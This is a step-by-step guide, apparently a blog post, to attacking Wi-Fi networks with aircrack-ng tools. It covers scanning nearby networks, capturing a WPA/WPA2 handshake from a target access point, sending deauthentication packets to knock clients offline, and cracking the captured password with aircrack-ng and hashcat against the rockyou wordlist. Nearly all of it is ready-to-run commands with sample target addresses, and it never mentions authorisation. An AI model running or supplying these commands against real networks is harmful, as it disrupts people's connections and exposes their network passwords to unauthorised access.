---
title: "📡 Wi-Fi Handshake Capture Guide using aircrack-ng Tools"
date: 2026-01-13
tags: ['security', 'networking', 'wpa-wpa2-cracking', 'packet-capture', 'wireless-security', 'wifi-jamming', 'dos-attack']
---

---

## 🔍 1. Scan Available WiFi Networks

### 🌐 Scan all nearby WiFi networks

```bash
sudo airodump-ng mon0
````

### 📶 Scan only 2.4 GHz networks (802.11b/g)

```bash
sudo airodump-ng --band bg mon0
```

### 📡 Scan only 5 GHz networks (802.11a)

```bash
sudo airodump-ng --band a mon0
```

### 📋 Band Option Summary

* `--band a` → 5 GHz (802.11a)
* `--band b` → 2.4 GHz (802.11b)
* `--band g` → 2.4 GHz (802.11g)
* `--band bg` → All 2.4 GHz (recommended)
* `--band abg` → Both 2.4 GHz and 5 GHz

---

## 🎯 2. Capture WPA/WPA2 Handshake

### 🎯 Start listening on target AP

```bash
# Replace <channel>, <BSSID>, and <output_filename>
sudo airodump-ng -c <channel> --bssid <BSSID> -w <output_filename> mon0
```

 Example
```bash
# Capture handshake from AP on channel 36
sudo airodump-ng -c 36 --bssid A0:70:B7:2C:07:70 -w Tenda.captured mon0
```

📝 This starts focused packet capture. Keep this terminal open!

---

## 💥 3. Force Reconnection with Deauth Attack

### 🔄 Deauth all clients on the target AP

```bash
sudo aireplay-ng --deauth 10 -a <BSSID> mon0
```

### 🎯 Deauth a specific client only

```bash
# Replace <BSSID> and <Client_MAC>
sudo aireplay-ng --deauth 10 -a <BSSID> -c <Client_MAC> mon0
```

Example
```bash
# Deauth one device from the AP
sudo aireplay-ng --deauth 10 -a A0:70:B7:2C:07:70 -c 32:6D:90:EC:CF:A0 mon0
```

📝 Send multiple deauth packets to force reconnect and capture the 4-way handshake.

---

## 🧪 4. Verify and Crack Handshake

### 🔍 Verify handshake with aircrack-ng

```bash
aircrack-ng Tenda.captured.cap -w rockyou.txt
```

📌 If a handshake is captured, it will be shown in the top-right during capture and crackable here.

---

### 🔄 Convert capture for Hashcat

```bash
hcxpcapngtool Tenda.captured.cap -o Tenda.hc22000
```

### 🔓 Crack handshake with Hashcat

```bash
hashcat -m 22000 Tenda.hc22000 rockyou.txt --show
```